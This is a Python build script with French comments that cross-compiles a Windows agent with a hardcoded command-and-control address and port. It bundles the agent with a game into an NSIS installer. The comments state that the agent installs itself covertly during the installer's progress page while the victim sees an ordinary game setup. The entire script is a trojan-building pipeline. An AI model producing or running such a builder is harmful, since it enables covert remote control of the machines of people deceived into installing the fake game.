#!/usr/bin/env python3
# language: Python 3, file: lex_forge.py, target: macOS
# ARKHAM FORGE - construit le VRAI installateur Windows (NSIS) avec le C2 bake
# Pipeline : compile lexagent avec le C2 -> makensis -> ArkhamSetup.exe (assistant pro)
# Usage: python3 lex_forge.py <ip_c2> <port>
import os, sys, subprocess

ROOT = os.path.dirname(os.path.abspath(__file__))
C2 = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.222"
PORT = sys.argv[2] if len(sys.argv) > 2 else "4444"
CC = "x86_64-w64-mingw32-g++"

os.chdir(ROOT)
os.makedirs("build", exist_ok=True)

print("[1/3] compilation de l'agent (C2 bake en dur)...")
r = subprocess.run(
    f'{CC} -O2 -std=c++17 -DLEX_C2=\'"{C2}"\' -DLEX_PORT={PORT} '
    f'src/lexagent.cpp -o build/lexagent.exe -lws2_32 -lgdi32',
    shell=True, capture_output=True)
if r.returncode != 0:
    print(r.stderr.decode()[:800]); sys.exit(1)
print(f"      [OK] build/lexagent.exe -> {C2}:{PORT}")

print("[2/3] jeu (deja compile, ArkhamGame.exe)...")
assert os.path.exists("build/ArkhamGame.exe"), "compile le jeu: g++ src/arkham_game.cpp -o build/ArkhamGame.exe -mwindows -lgdi32"

print("[3/3] NSIS : assistant d'installation professionnel...")
r = subprocess.run("makensis arkham.nsi", shell=True, capture_output=True)
log = r.stdout.decode() + r.stderr.decode()
if "Output:" not in log:
    print(log[-1200:]); sys.exit(1)
for line in log.splitlines():
    if "Output:" in line or "Install size" in line:
        print("      " + line.strip())

out = os.path.join(ROOT, "sorties", "ArkhamSetup.exe")
print(f"\n[OK] {out} ({os.path.getsize(out)/1024/1024:.1f} Mo)")
print("     assistant : licence -> dossier -> progression -> fin (lancement du jeu)")
print("     l'agent s'installe pendant la page de progression (nsExec cache)")
print("     raccourcis reels : Bureau + menu Demarrer")

